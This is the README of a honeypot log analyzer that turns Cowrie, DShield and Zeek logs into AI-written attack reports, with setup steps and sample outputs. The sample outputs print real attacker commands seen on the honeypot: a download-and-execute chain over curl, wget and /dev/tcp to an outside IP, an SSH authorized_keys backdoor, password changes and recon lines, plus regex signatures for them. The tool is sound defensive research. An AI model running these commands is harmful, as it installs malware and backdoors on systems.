
# honeypot-ai

#### A modular honeypot log analyzer and OSINT collector with OpenAI integration to easily create ISC style reports and interactively chat with AI about attacks. Currently supports Cowrie, DShield and Zeek logs. 
> Built by Lucas Faudman for SANS ISC/DShield

## Attack Examples

| Attack | AI Run Steps |
| --- | --- |
| [Unauthenticated Command Execution Attack Exploiting Vulnerable Netgear Devices from IP 178.72.69.244 for Malware Deployment](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Unauthenticated%20Command%20Execution%20Attack%20Exploiting%20Vulnerable%20Netgear%20Devices%20from%20IP%20178.72.69.244%20for%20Malware%20Deployment) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Unauthenticated%20Command%20Execution%20Attack%20Exploiting%20Vulnerable%20Netgear%20Devices%20from%20IP%20178.72.69.244%20for%20Malware%20Deployment/run-steps.md) |
| [Multi-Stage SSH Brute Force Attack with Possible Botnet Indications Launched from Compromised DigitalOcean Server](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Stage%20SSH%20Brute%20Force%20Attack%20with%20Possible%20Botnet%20Indications%20Launched%20from%20Compromised%20DigitalOcean%20Server) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Stage%20SSH%20Brute%20Force%20Attack%20with%20Possible%20Botnet%20Indications%20Launched%20from%20Compromised%20DigitalOcean%20Server/run-steps.md) |
| [Multi-Vector Cyber Attack Exploiting Shellshock and Targeting Apache Tomcat via Compromised IP Addresses](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Vector%20Cyber%20Attack%20Exploiting%20Shellshock%20and%20Targeting%20Apache%20Tomcat%20via%20Compromised%20IP%20Addresses) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Multi-Vector%20Cyber%20Attack%20Exploiting%20Shellshock%20and%20Targeting%20Apache%20Tomcat%20via%20Compromised%20IP%20Addresses/run-steps.md) |
| [Malicious IP 204.76.203.13: Unauthorized Access, Malware Deployment, and Persistence](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Malicious%20IP%20204.76.203.13%3A%20Unauthorized%20Access%2C%20Malware%20Deployment%2C%20and%20Persistence) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Malicious%20IP%20204.76.203.13%3A%20Unauthorized%20Access%2C%20Malware%20Deployment%2C%20and%20Persistence/run-steps.md) |
| [Telnet Compromise and Shell Script Malware Deployment on Linux Honeypot by Organized Attacker](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Telnet%20Compromise%20and%20Shell%20Script%20Malware%20Deployment%20on%20Linux%20Honeypot%20by%20Organized%20Attacker) | [run-steps.md](https://github.com/LucasFaudman/honeypot-ai/blob/main/example-reports/Telnet%20Compromise%20and%20Shell%20Script%20Malware%20Deployment%20on%20Linux%20Honeypot%20by%20Organized%20Attacker/run-steps.md) |

<details>
<summary>
<h2>Setup</h2>
</summary>


#### Step 1: Clone the Repository

```bash
git clone https://github.com/LucasFaudman/honeypot-ai
```

#### Step 2: Run the Setup Script [setup.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup.sh)

```bash
chmod +x honeypot-ai/setup.sh && honeypot-ai/setup.sh
```
> This will install all required packages in a virtual environment and walk you through setting up your config.json file. 

> You will need your honeypot IP and login credentials to create [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh) and [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh).

#### Optional: Install Zeek on your Honeypot using [install-zeek-on-honeypot.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/install-zeek-on-honeypot.sh)

```bash
honeypot-ai/install-zeek-on-honeypot.sh
```

#### Step 3: Sync Logs from Honeypot to local logs directory using [sync-logs.sh](https://github.com/LucasFaudman/honeypot-ai/blob/main/setup/sync-logs.sh)

```bash
honeypot-ai/sync-logs.sh
```

#### Step 4: Run Honeypot-AI with --help to see all command line arguments and options.

```bash
honeypot-ai/run.sh --help
```

OR

```bash
python3 honeypot-ai/main.py --help
```

</details>

---


<details>
<summary>
<h2>Basic Usage</h2>
</summary>

> Load attacks from logs then list all attacks

```bash
honeypot-ai/run.sh --load-from-logs --list-attacks
```

<details>
<summary>
Output
</summary>


```
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh --load-from-logs --list-attacks
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x114586310>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x114586250>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(49->48) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 6768: c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 6768 attempts (0.0000%) 
Merge Attacks Time: 0.6892s
(48->48) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\?cd\+/tmp')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(48->43) - Merged 5 attacks with shared sig regexes

Exceptions:
Total: 0

Stats:
 380 IPs with >=1 successful logins
 323 IPs with >=1 commands
 220 IPs with >=1 commands and >=1 malware
 3486 IPs with >=1 http requests
 56 IPs with flagged http requests
 4978 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 43

Attacks:
1: Attack (mhash: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2), SourceIPs: 209, Sessions: 3551, SSH: 3551, Commands: 20, Cmdlogs: 2, Malware: 1 
2: Attack (chash: 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75), SourceIPs: 40, Sessions: 60, Telnet: 60, Commands: 10, Cmdlogs: 1, 
3: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 33, Sessions: 91, Telnet: 91, Commands: 16, Cmdlogs: 1, 
4: Attack (chash: 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8), SourceIPs: 17, Sessions: 794, SSH: 794, Commands: 2, Cmdlogs: 1, 
5: Attack (hhash: 7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656), SourceIPs: 10, Sessions: 1306, HTTP: 1306, Httplogs: 147 
6: Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 5, Sessions: 762, SSH: 762, Commands: 1, Cmdlogs: 1, 
7: Attack (chash: 7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804), SourceIPs: 5, Sessions: 476, SSH: 476, Commands: 2, Cmdlogs: 1, 
8: Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 18, HTTP: 18, Httplogs: 1 
9: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
10: Attack (hhash: 0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518), SourceIPs: 3, Sessions: 1561, HTTP: 1561, Httplogs: 520 
11: Attack (hhash: 2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55), SourceIPs: 3, Sessions: 63, HTTP: 63, Httplogs: 6 
12: Attack (hhash: 51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13), SourceIPs: 3, Sessions: 48, HTTP: 48, Httplogs: 16 
13: Attack (hhash: 6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1), SourceIPs: 3, Sessions: 21, HTTP: 21, Httplogs: 2 
14: Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 9, SSH: 9, Commands: 3, Cmdlogs: 4, Malware: 3 
15: Attack (hhash: 0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98), SourceIPs: 3, Sessions: 3, HTTP: 3, Httplogs: 1 
16: Attack (chash: eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80), SourceIPs: 2, Sessions: 1658, SSH: 1656, HTTP: 2, Commands: 1, Cmdlogs: 1, Httplogs: 1 
17: Attack (hhash: 6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00), SourceIPs: 2, Sessions: 20, HTTP: 20, Httplogs: 9 
18: Attack (hhash: 846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2), SourceIPs: 2, Sessions: 6, HTTP: 6, Httplogs: 2 
19: Attack (chash: a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9), SourceIPs: 2, Sessions: 2, SSH: 2, Commands: 4, Cmdlogs: 1, 
20: Attack (hhash: 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e), SourceIPs: 2, Sessions: 2, HTTP: 2, Httplogs: 1 
21: Attack (hhash: 50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2), SourceIPs: 1, Sessions: 560, HTTP: 560, Httplogs: 560 
22: Attack (hhash: 7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9), SourceIPs: 1, Sessions: 142, HTTP: 142, Httplogs: 71 
23: Attack (hhash: ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59), SourceIPs: 1, Sessions: 32, HTTP: 32, Httplogs: 15 
24: Attack (hhash: 4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a), SourceIPs: 1, Sessions: 30, HTTP: 30, Httplogs: 26 
25: Attack (hhash: ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf), SourceIPs: 1, Sessions: 27, HTTP: 27, Httplogs: 27 
26: Attack (hhash: 79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65), SourceIPs: 1, Sessions: 24, HTTP: 24, Httplogs: 24 
27: Attack (hhash: 0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67), SourceIPs: 1, Sessions: 23, HTTP: 23, Httplogs: 22 
28: Attack (hhash: f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac), SourceIPs: 1, Sessions: 12, HTTP: 12, Httplogs: 11 
29: Attack (hhash: a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758), SourceIPs: 1, Sessions: 10, HTTP: 10, Httplogs: 10 
30: Attack (chash: 6fa4c8ac58e7a1d947dc3250c39d1e27958f012e68061d8de0a7b70e3a65b906), SourceIPs: 1, Sessions: 7, SSH: 7, Commands: 1, Cmdlogs: 1, 
31: Attack (mhash: 249a049e611f83823c514eb7b904977ae94371768ea3a93160378a9f757827cc), SourceIPs: 1, Sessions: 4, SSH: 4, Malware: 1 
32: Attack (hhash: bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf), SourceIPs: 1, Sessions: 4, HTTP: 4, Httplogs: 1 
33: Attack (mhash: 7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d), SourceIPs: 1, Sessions: 2, SSH: 2, Malware: 1 
34: Attack (hhash: 3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
35: Attack (hhash: 30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01), SourceIPs: 1, Sessions: 2, HTTP: 2, Httplogs: 2 
36: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
37: Attack (hhash: 3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
38: Attack (hhash: d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
39: Attack (hhash: 2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
40: Attack (hhash: f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
41: Attack (hhash: a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
42: Attack (hhash: 63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
43: Attack (hhash: 801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade), SourceIPs: 1, Sessions: 1, HTTP: 1, Httplogs: 1 
Total: 43
Honeypot AI Finished Successfully!
```

</details>


> Load attacks from logs then list first 5 attacks sorted in descending order by number of commands, then start time. Then print the commands for each attack

```bash
honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
```

<details>
<summary>
Output
</summary>


```
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl --list --max-attacks 5 --sort-order desc --sort-attrs num_commands start_time --print commands
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11760e7d0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11760e710>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(49->48) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 6768: c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 6768 attempts (0.0000%) 
Merge Attacks Time: 0.7078s
(48->48) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\?cd\+/tmp')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\??A@/ ?X'8ELFX")
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(48->43) - Merged 5 attacks with shared sig regexes
Skipping 38 attacks (max_attacks=5)

Exceptions:
Total: 0

Stats:
 380 IPs with >=1 successful logins
 323 IPs with >=1 commands
 220 IPs with >=1 commands and >=1 malware
 3486 IPs with >=1 http requests
 56 IPs with flagged http requests
 4978 Benign IPs. (Generated log events but not in any attacks)
Total attacks: 5

Attacks:
1: Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
2: Attack (mhash: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2), SourceIPs: 209, Sessions: 3551, SSH: 3551, Commands: 20, Cmdlogs: 2, Malware: 1 
3: Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 33, Sessions: 91, Telnet: 91, Commands: 16, Cmdlogs: 1, 
4: Attack (chash: 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75), SourceIPs: 40, Sessions: 60, Telnet: 60, Commands: 10, Cmdlogs: 1, 
5: Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
Total: 5

Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 1, SSH: 1, Commands: 21, Cmdlogs: 1, 
commands:
['echo 1 && cat /bin/echo',
 'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '
 'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '
 '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '
 "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "
 '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '
 'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYjxNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhIhJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOmKaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkEBOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA3v4Q==; '
 'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '
 'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYjxNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhIhJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOmKaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkEBOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA3v4Q==" '
 '&',
 'head -c 0 > /tmp/UVPRQdahjX',
 'chmod 777 /tmp/UVPRQdahjX',
 '/tmp/UVPRQdahjX '
 'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYjxNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhIhJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOmKaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkEBOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA3v4Q==',
 'cp /tmp/UVPRQdahjX /tmp/linux',
 'head -c 0 > /tmp/winminer_sign',
 'head -c 0 > /tmp/winminer',
 'head -c 0 > /tmp/linux_sign',
 'head -c 0 > /tmp/mipsel_linux_sign',
 'head -c 0 > /tmp/mips_linux',
 'head -c 0 > /tmp/mips_linux_sign',
 'head -c 0 > /tmp/windows_sign',
 'head -c 0 > /tmp/arm_linux_sign',
 'head -c 0 > /tmp/miner',
 'head -c 0 > /tmp/mipsel_linux',
 'head -c 0 > /tmp/windows',
 'head -c 0 > /tmp/arm_linux',
 'head -c 0 > /tmp/miner_sign',
 '',
 'exit']


Attack (mhash: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2), SourceIPs: 209, Sessions: 3551, SSH: 3551, Commands: 20, Cmdlogs: 2, Malware: 1 
commands:
['cd ~; chattr -ia .ssh; lockr -ia .ssh',
 'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa '
 'AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== '
 'mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~',
 'cat /proc/cpuinfo | grep name | wc -l',
 'echo -e "admin\nSytHfidvFet7\nSytHfidvFet7"|passwd|bash',
 'Enter new UNIX password: ',
 'echo "admin\nSytHfidvFet7\nSytHfidvFet7\n"|passwd',
 "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
 "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
 'ls -lh $(which ls)',
 'which ls',
 'crontab -l',
 'w',
 'uname -m',
 'cat /proc/cpuinfo | grep model | grep name | wc -l',
 'top',
 'uname',
 'uname -a',
 'whoami',
 'lscpu | grep Model',
 "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'"]


Attack (chash: ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70), SourceIPs: 33, Sessions: 91, Telnet: 91, Commands: 16, Cmdlogs: 1, 
commands:
['sh',
 'shell',
 'enable',
 'system',
 'ping;sh',
 'kill %%1',
 '',
 '/bin/busybox cat /proc/self/exe || cat /proc/self/exe',
 'sh',
 'shell',
 'enable',
 'system',
 'ping;sh',
 'kill %%1',
 '',
 '/bin/busybox cat /proc/self/exe || cat /proc/self/exe']


Attack (chash: 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75), SourceIPs: 40, Sessions: 60, Telnet: 60, Commands: 10, Cmdlogs: 1, 
commands:
['enable',
 'system',
 'shell',
 'sh',
 'cat /proc/mounts; /bin/busybox RXSFY',
 'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RXSFY',
 'tftp; wget; /bin/busybox RXSFY',
 'dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s',
 '/bin/busybox RXSFY',
 'rm .s; exit']


Attack (chash: 1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687), SourceIPs: 4, Sessions: 4, SSH: 4, Commands: 8, Cmdlogs: 1, 
commands:
['/ip cloud print',
 'ifconfig',
 'uname -a',
 'cat /proc/cpuinfo',
 "ps | grep '[Mm]iner'",
 "ps -ef | grep '[Mm]iner'",
 'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log '
 '/etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman '
 '/dev/modem* /var/config/sms/*',
 'echo Hi | cat -n']

Honeypot AI Finished Successfully!
```

</details>


> Organize attacks with at most 10 source IPs into attack directories for faster loading and to prepare for storing analysis results

```bash
honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
```

<details>
<summary>
Output
</summary>


```
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x116142dd0>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x116142d50>
Removed e1f5ed39177c9c96bc2908f62e3b8915651ed440b76e325e8aadc0ff204e65b3 with ips {'172.31.5.68'}
(49->48) - Removed 1 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 6768: c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 6768 attempts (0.0000%) 
Merge Attacks Time: 0.7165s
(48->48) - Merged 0 attacks with shared attrs
Regex merged b9a4719c49a20cdd0865db0216e3d4013b6961bcfc4d55f86b663a65b1e6dce1 into 28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e on http_requests: re.compile('GET /shell\?cd\+/tmp')
Regex merged 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 into 8f3dff1e7b287ae12972828278c29796dd85dbae1b18b29ed81fc839ecd93695 on commands: re.compile(">\??A@/ ?X'8ELFX")
